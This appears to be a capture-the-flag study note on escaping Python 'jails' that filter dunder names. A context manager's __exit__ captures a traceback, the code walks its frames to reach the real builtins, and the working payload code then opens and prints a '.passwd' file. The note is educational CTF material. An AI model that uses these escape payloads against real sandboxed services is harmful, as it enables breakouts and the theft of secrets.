---
title: "07 — Traceback and Frame Escape"
date: 2026-10-31
categories: [python-jail]
tags: [pyjail, python, security]
---
# 07 — Traceback and Frame Escape

When you can execute code but cannot name dunder attributes, exceptions become
the delivery mechanism for real objects: a traceback carries frames, and frames
carry `f_globals`.

## Traceback object model

- `BaseException.__traceback__` — the traceback (dunder, hard to name).
- Traceback has `.tb_frame` (current frame), `.tb_next` (next traceback).
- Frame has `.f_back` (caller/enclosing frame), `.f_globals`, `.f_locals`,
  `.f_code`.
- `f_globals` is the globals dict of the function/module owning that frame.

Some frame in the call stack belongs to the service module or interpreter
machinery where `platform`, real `builtins`, `os`, etc. live.

## The problem

You cannot write:
```python
try:
    1 / 0
except Exception as e:
    tb = e.__traceback__   # '__traceback__' contains '__' -> filtered
```

## The bypass: context manager `__exit__`

Python passes the traceback to `__exit__` as an ordinary positional argument
during `with` handling. Define the manager with `type()` and string keys so
dunder names stay out of `co_names`:

```python
def handler(self, t, v, tb):
    # tb is the real traceback
    ...
    return True   # suppress the exception

M = type("M", (), {
    "__enter__": (lambda s: s),
    "__exit__": handler,
})

with M():
    1 / 0
```

This is the heart of `python_eval_is_evil`.

## Walking frames

Inside `handler`:
```python
cur = tb
found = []
while cur is not None:
    f = cur.tb_frame
    while f is not None:
        if "platform" in f.f_globals:   # or "builtins", "os", ...
            found.append(f.f_globals)
        f = f.f_back
    cur = cur.tb_next
```

- `cur.tb_frame` → frame of the failed operation.
- `f.f_back` → enclosing/caller frames.
- `f.f_globals` → that frame's module/function globals.

## Storing results across scopes

A function object allows normal attribute assignment without `global`:
```python
say_hello.found = []
```
Use this as a shared container between `handler` and the top-level code, since
the jail may restrict `global`/`nonlocal` or `globals()`.

## Using reached globals

```python
for g in found:
    try:
        platform = g.get("platform")
        if platform is None:
            continue
        osmod = platform.os
        builtins = g.get("__builtins__")
        h = builtins.open(osmod.path.join(osmod.getcwd(), ".passwd"))
        print(h.read())
        h.close()
    except Exception:
        pass
```

`g.get("__builtins__")` retrieves the *real* builtins dict, which has `open`,
`eval`, `exec`, etc. — bypassing the restricted `BUILTINS`.

## Variants

- Raise any exception, not just `ZeroDivisionError`: `1/0`, `x[0]` with
  undefined `x`, `int("a")`, or call a failing function.
- If `with` is unavailable, use `try/except` and access
  `sys.exc_info()[2]` — but `sys` may be blocked; the context-manager route
  avoids needing `sys`.
- On Python 3.11+, `except*` and exception groups exist but are not needed.

## Why this defeats `co_names` filters

The filter inspects names the *compiler* emits. In the payload above, `co_names`
contains things like `type`, `handler`, `M`, `found`, `platform`, `open` —
no dunder. The dunder strings (`"__enter__"`, `"__exit__"`, `"__builtins__"`,
`"__globals__"`) are all *constants*, invisible to the filter.

## Caveats

- Frame availability depends on how the jail invokes your code. If the jail
  uses `eval` in a way that adds no intermediate frames, you may still reach
  the service module's frames via `f_back` chains.
- Searching for `"platform" in f.f_globals` is a heuristic; try also
  `"__builtins__"`, `"say_hello"`, `"sandbox"`, `"os"`, `"sys"`.
- Suppressing the exception (`return True`) prevents the jail from printing an
  error and aborting.
- Store results in a shared container; local variables in `handler` are lost
  when it returns.
- This technique is Python-version-agnostic for 3.6+ and 2.7 (traceback/frame
  model is stable).

